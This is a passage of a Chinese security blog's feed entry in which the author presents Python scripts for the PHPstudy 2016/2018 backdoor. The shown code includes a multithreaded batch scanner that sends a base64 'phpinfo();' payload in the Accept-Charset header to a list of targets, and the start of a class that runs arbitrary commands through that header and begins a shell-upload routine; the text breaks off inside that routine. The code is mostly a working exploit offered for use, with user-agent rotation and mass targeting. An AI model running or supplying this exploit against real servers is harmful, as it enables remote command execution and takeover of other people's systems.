    
      <category term="python" scheme="https://www.lsowl.top/tags/python/"/>
    
      <category term="loguru" scheme="https://www.lsowl.top/tags/loguru/"/>
    
  </entry>
  
  <entry>
    <title>PHPstudy后门漏洞POC-EXP编写</title>
    <link href="https://www.lsowl.top/2019/10/14/PHPstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9EPOC-EXP%E7%BC%96%E5%86%99/"/>
    <id>https://www.lsowl.top/2019/10/14/PHPstudy后门漏洞POC-EXP编写/</id>
    <published>2019-10-13T16:42:21.000Z</published>
    <updated>2019-10-13T17:08:29.650Z</updated>
    
    <content type="html"><![CDATA[<h3 id="PHPstudy后门漏洞POC-EXP编写"><a href="#PHPstudy后门漏洞POC-EXP编写" class="headerlink" title="PHPstudy后门漏洞POC-EXP编写"></a>PHPstudy后门漏洞POC-EXP编写</h3><blockquote><p>phpstudy后门事件过去有一段时间了，漏洞也已经复现了；网上有好多检测的POC，为什么要自己写呢，因为好久没有写代码了，通过这个漏洞巩固一下code，代码国庆前写了一半，被各种事情耽搁，今天补写完整。这次写代码使用面向对象以及参数化编写，就漏洞本身来说，这种方式很麻烦，但是为了毕设的代码量练习（小声BB）。脚本支持PHPstudy2018和2016后门漏洞的检测、利用以及直接上传shell。</p></blockquote><h3 id="代码-and-效果"><a href="#代码-and-效果" class="headerlink" title="代码 and 效果"></a>代码 and 效果</h3><h4 id="批量检测POC"><a href="#批量检测POC" class="headerlink" title="批量检测POC"></a>批量检测POC</h4><p>支持自定义输入目标文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: demos</span></span><br><span class="line"><span class="string">@Github: https://github.com/demossl</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> threadpool</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20"</span>,</span><br><span class="line">    <span class="string">"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"</span></span><br><span class="line">]</span><br><span class="line">TIME_OUT=<span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url)</span>:</span></span><br><span class="line">    payload = <span class="string">"phpinfo();"</span></span><br><span class="line">    payload = base64.b64encode(payload.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    headers = &#123;&#125;</span><br><span class="line">    headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">    headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">    headers[<span class="string">'Accept-Charset'</span>] = payload</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = requests.get(url,headers=headers,timeout=TIME_OUT)</span><br><span class="line">        result.encoding = <span class="string">'gbk'</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"phpinfo"</span> <span class="keyword">in</span> str(result.content):</span><br><span class="line">            print(<span class="string">'[+] Target is vulnerable.'</span>)</span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'success.txt'</span>,<span class="string">'a'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(url + <span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] Target is NOT vulnerable.'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">'[-] some error!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    files = input(<span class="string">'please input the files:\n'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(files,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            lines = f.read().splitlines()</span><br><span class="line">            print(lines)</span><br><span class="line">            task_pool = threadpool.ThreadPool(<span class="number">10</span>)</span><br><span class="line">            requests = threadpool.makeRequests(check,lines)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> req <span class="keyword">in</span> requests:</span><br><span class="line">            task_pool.putRequest(req)</span><br><span class="line">            task_pool.wait()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570982761.17.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570982822.79.png" alt></p><h4 id="带参数检测、利用、传shell"><a href="#带参数检测、利用、传shell" class="headerlink" title="带参数检测、利用、传shell"></a>带参数检测、利用、传shell</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: demos</span></span><br><span class="line"><span class="string">@Github: https://github.com/demossl</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20"</span>,</span><br><span class="line">    <span class="string">"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"</span></span><br><span class="line">]</span><br><span class="line">TIME_OUT=<span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpstudy_backdoor_getshell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url,command)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">        self._command = command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#访问器 - getter()方法</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#修改器 - setter()方法</span></span><br><span class="line"><span class="meta">    @url.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @command.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self,command)</span>:</span></span><br><span class="line">        self._command = command</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_Target</span><span class="params">(self)</span>:</span></span><br><span class="line">        poc = &#123;</span><br><span class="line">            <span class="string">"Accept-Charset"</span>: <span class="string">"cGhwaW5mbygpOw=="</span>,</span><br><span class="line">            <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip,deflate"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            PocRequest = requests.get(self._url,headers=poc,timeout=TIME_OUT)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"phpinfo"</span> <span class="keyword">in</span> str(PocRequest.content):</span><br><span class="line">                print(<span class="string">'[+] Target is vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Target is NOT vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = self._command</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Command Execute Successful.'</span>)</span><br><span class="line">                print(response.text)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2018</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] 